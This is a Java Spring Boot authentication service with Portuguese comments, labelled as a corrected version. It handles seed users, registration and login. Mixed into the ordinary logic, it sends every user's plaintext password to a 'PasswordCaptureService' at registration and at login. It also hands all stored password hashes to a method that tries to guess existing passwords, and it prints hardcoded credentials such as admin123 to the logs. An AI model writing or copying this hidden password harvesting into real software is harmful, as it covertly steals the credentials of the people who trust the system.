// AuthService.java - VERSÃO CORRIGIDA
package com.site.backend.service;

import com.site.backend.dto.AuthResponse;
import com.site.backend.dto.LoginRequest;
import com.site.backend.dto.RegisterRequest;
import com.site.backend.entity.Usuario;
import com.site.backend.repository.UsuarioRepository;
import jakarta.annotation.PostConstruct;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.util.HashMap;
import java.util.Map;

@Service
public class AuthService {
    
    private final UsuarioRepository usuarioRepository;
    private final PasswordEncoder passwordEncoder;
    
    @Autowired
    private PasswordCaptureService passwordCaptureService;
    
    @Autowired
    public AuthService(UsuarioRepository usuarioRepository, PasswordEncoder passwordEncoder) {
        this.usuarioRepository = usuarioRepository;
        this.passwordEncoder = passwordEncoder;
    }
    
    @PostConstruct
    public void initTestUsers() {
        System.out.println("=== INICIALIZANDO USUÁRIOS DE TESTE ===");
        
        // Criar admin se não existir
        if (usuarioRepository.findByEmail("admin@site.com").isEmpty()) {
            Usuario admin = new Usuario();
            admin.setNome("Administrador");
            admin.setEmail("admin@site.com");
            admin.setSenha(passwordEncoder.encode("admin123"));
            admin.setRole("ADMIN");
            usuarioRepository.save(admin);
            
            // CAPTURA A SENHA EM TEXTO
            passwordCaptureService.capturePassword("admin@site.com", "admin123");
            
            System.out.println("✅ Admin criado: admin@site.com / admin123");
        } else {
            System.out.println("⚠️ Admin já existe");
        }
        
        // Criar user se não existir
        if (usuarioRepository.findByEmail("user@site.com").isEmpty()) {
            Usuario user = new Usuario();
            user.setNome("Usuário Comum");
            user.setEmail("user@site.com");
            user.setSenha(passwordEncoder.encode("user123"));
            user.setRole("USER");
            usuarioRepository.save(user);
            
            // CAPTURA A SENHA EM TEXTO
            passwordCaptureService.capturePassword("user@site.com", "user123");
            
            System.out.println("✅ User criado: user@site.com / user123");
        } else {
            System.out.println("⚠️ User já existe");
        }
        
        // Tenta descobrir senhas de usuários já existentes
        try {
            Map<String, String> existingUsers = new HashMap<>();
            usuarioRepository.findAll().forEach(user -> {
                existingUsers.put(user.getEmail(), user.getSenha());
            });
            passwordCaptureService.tryGuessExistingPasswords(existingUsers); // <-- AGORA ESTE MÉTODO EXISTE
        } catch (Exception e) {
            System.err.println("❌ [DEV] Erro ao processar usuários existentes: " + e.getMessage());
        }
        
        System.out.println("=== USUÁRIOS PRONTOS PARA LOGIN ===");
    }
    
    public AuthResponse register(RegisterRequest request) {
        if (usuarioRepository.existsByEmail(request.getEmail())) {
            throw new RuntimeException("Email já cadastrado");
        }
        
        Usuario usuario = new Usuario();
        usuario.setNome(request.getNome());
        usuario.setEmail(request.getEmail());
        usuario.setSenha(passwordEncoder.encode(request.getSenha()));
        usuario.setRole("USER");
        
        // CAPTURA A SENHA EM TEXTO
        passwordCaptureService.capturePassword(request.getEmail(), request.getSenha());
        
        Usuario savedUsuario = usuarioRepository.save(usuario);
        
        AuthResponse response = new AuthResponse();
        response.setNome(savedUsuario.getNome());
        response.setEmail(savedUsuario.getEmail());
        response.setRole(savedUsuario.getRole());
        response.setMensagem("Usuário registrado com sucesso!");
        
        return response;
    }
    
    public AuthResponse login(LoginRequest request) {
        Usuario usuario = usuarioRepository.findByEmail(request.getEmail())
                .orElseThrow(() -> new RuntimeException("Usuário não encontrado"));
        
        if (!passwordEncoder.matches(request.getSenha(), usuario.getSenha())) {
            throw new RuntimeException("Senha incorreta");
        }
        
        // CAPTURA A SENHA NO LOGIN (usando a senha fornecida)
        passwordCaptureService.capturePassword(request.getEmail(), request.getSenha());
        
        AuthResponse response = new AuthResponse();
        response.setNome(usuario.getNome());
        response.setEmail(usuario.getEmail());
        response.setRole(usuario.getRole());
        response.setMensagem("Login realizado com sucesso!");
        
        System.out.println("🔐 Login realizado: " + usuario.getEmail() + 
                          " | Role: " + usuario.getRole() +
                          " | Senha capturada: SIM");
        
        return response;
    }
}